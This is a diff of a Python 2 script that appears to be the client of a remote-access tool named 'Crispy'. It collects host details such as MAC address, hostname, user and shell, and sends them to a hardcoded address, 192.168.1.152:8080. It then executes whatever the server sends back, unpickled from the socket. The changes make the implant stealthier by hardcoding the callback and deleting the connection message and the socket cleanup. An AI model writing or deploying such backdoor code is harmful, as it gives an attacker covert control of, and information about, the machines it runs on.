@@ -74,12 +74,10 @@ def enum():
     return (macaddr, hostname, plat, proc_type, proc_arch, uptime, date, user, home, shell)
 
 def main():
-    if len(sys.argv) == 2:
-	host, port = sys.argv[1].split(":")
-    
+    host, port = "192.168.1.152", 8080
+
     try:
 	sock = CrispyTCPClient().connect(host, port)
-	print "[+] Connected successfully"
 	sock.send(json.dumps(enum()))
 	while True:
 	    data = cPickle.loads(sock.recv(1024))
@@ -88,8 +86,6 @@ def main():
 	pass
     except:
         pass
-    finally:
-	sock.close()
 
 if __name__ == "__main__":
     main()
